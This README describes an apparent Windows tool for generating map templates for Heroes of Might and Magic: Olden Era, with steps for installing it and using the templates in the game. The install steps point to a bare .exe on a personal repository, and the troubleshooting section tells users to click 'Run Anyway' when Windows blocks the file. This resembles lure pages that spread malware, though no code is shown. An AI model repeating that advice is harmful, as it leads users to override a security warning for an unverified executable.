# 🛠️ Olden-Era-Template-Generator - Custom map templates for your game

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Rupertfrozen923/Olden-Era-Template-Generator)

This tool creates random map templates for Heroes of Might and Magic: Olden Era. You can design map layouts, zone settings, and creature distributions using this software. It removes the need for manual configuration.

## 📋 System Requirements

The application runs on Windows 11. Your computer needs the following:

- Windows 11 operating system.
- 50 megabytes of available disk space.
- An active internet connection for initial setup.
- Basic familiarity with file management folders.

## 📥 How to Install

Follow these steps to set up the software:

1. Visit the [official repository page](https://github.com/Rupertfrozen923/Olden-Era-Template-Generator).
2. Look for the section labeled Releases on the right side of the screen.
3. Click the most recent version link.
4. Locate the file ending in .exe.
5. Save the file to your computer.
6. Open your Downloads folder.
7. Double-click the file to start the installer.
8. Follow the prompts on your screen to complete the installation.

## ⚙️ How to Generate Templates

The generator uses a simple interface to build map configurations. 

1. Launch the application from your desktop icon.
2. Select the map size you want to build. Common sizes include S, M, L, and XL.
3. Choose your zone layout settings. These settings define how the computer places terrain and structures.
4. Adjust the creature density bars. Moving the bar right increases the amount of monsters on the map. Entering specific numbers allows for precise control over difficulty.
5. Review your configuration in the preview pane. 
6. Click the Save Template button.
7. Choose a name for your file and pick a location on your hard drive. 
8. The software generates a JSON file. This file contains the ruleset for your random map generator.

## 🎮 Using Templates in the Game

Once you save the file, you must move it to the correct folder for your game to recognize it:

1. Navigate to your Olden Era installation directory. This is typically located in C:\Program Files\OldenEra.
2. Open the folder named Templates.
3. If this folder does not exist, right-click inside the directory, select New, then select Folder, and name it "Templates".
4. Copy your new JSON file from its current location.
5. Paste the file into the Templates folder.
6. Start your game.
7. Select the Random Map Generator option from the main menu.
8. Your new template appears in the dropdown list within the game settings.

## 🔧 Troubleshooting Common Issues

If you run into trouble, check these common fixes:

- Application will not start: Ensure your Windows 11 system is up to date. Occasionally, system security settings prevent new software from running. You may need to click "More Info" and then "Run Anyway" if Windows blocks the file.
- File missing in-game: Verify that you placed the JSON file in the correct subfolder. The game only looks for files in the designated Templates directory.
- JSON error: If the game displays an error when loading a map, your file may have invalid settings. Re-open the software, double-check your numbers for zones and creatures, and save the file again.
- Software is stuck: Close the program and start it again. Your progress saves automatically to a temporary file when you adjust sliders.

## 📏 Feature Overview

The software includes several tools to help map makers:

- Custom Zone Editor: Assign specific environment types to different map sections.
- Treasure Balance Tool: Adjust the quantity and quality of artifacts and resources.
- Creature Preset Selector: Choose standard monster groups or create your own custom lists.
- Multiplayer Support: Configure map rules specifically for player-versus-player scenarios.
- Random Seed Generator: Create unpredictable maps based on unique character strings.
- Import/Export functionality: Share your designs with friends by sending them the JSON files directly. 

## 🗺️ Customizing Zone Layouts

The zone layout feature defines the shape and flow of your map. You can define connection points between zones to create bottlenecks or open areas. Dense zones contain more resources but higher difficulty. Sparse zones offer fewer rewards but provide faster movement. Balancing these variables creates a fun experience for multiplayer games. Use the preview mode to visualize how your zones connect before you export the final file.

## 📈 Understanding File Formats

The software exports data in JSON format. JSON is a text-based format that machines read easily. You can open these files in any text editor like Notepad. While we encourage you to use our software for editing, advanced users may change values directly within the text file if they desire. Always keep a backup copy of your template files before you modify them manually. 

## 🛡️ Data Privacy

This tool runs locally on your computer. It does not send your data to external servers. Your templates stay on your machine unless you share them. We do not track your activity or collect personal information. The software needs access to your local folders only to save and load your map configurations.

## 💡 Best Practices

Keep your templates organized. Create a folder structure within your Templates directory to separate your designs by style or map size. If you create a template that works well for a specific party size, rename the file to include those details. This makes selection easier when you start a new game. Test your templates on different map sizes to see how the software adapts your rules to larger or smaller areas. Small adjustments to creature density often produce large changes in map feel. Take your time to find the settings that suit your play style.